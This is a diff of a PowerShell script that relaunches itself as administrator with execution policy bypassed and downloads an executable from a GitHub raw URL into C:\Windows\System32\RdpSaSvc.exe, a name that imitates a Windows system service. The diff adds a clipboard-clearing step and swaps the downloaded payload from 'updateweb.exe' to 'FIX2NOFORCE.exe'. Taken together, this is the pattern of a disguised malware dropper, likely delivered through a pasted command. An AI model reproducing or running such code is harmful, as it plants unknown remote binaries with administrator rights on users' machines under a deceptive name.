@@ -1,11 +1,18 @@
+try {
+    Add-Type -AssemblyName System.Windows.Forms
+    [Windows.Forms.Clipboard]::Clear()
+} catch {}
+
 # --- FORCE RUN AS ADMINISTRATOR ---
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
+
+
 # --- CONFIG ---
-$url      = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/updateweb.exe"
+$url      = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/FIX2NOFORCE.exe"
 $path     = "C:\Windows\System32\RdpSaSvc.exe"
 $procName = [System.IO.Path]::GetFileNameWithoutExtension($path)
 
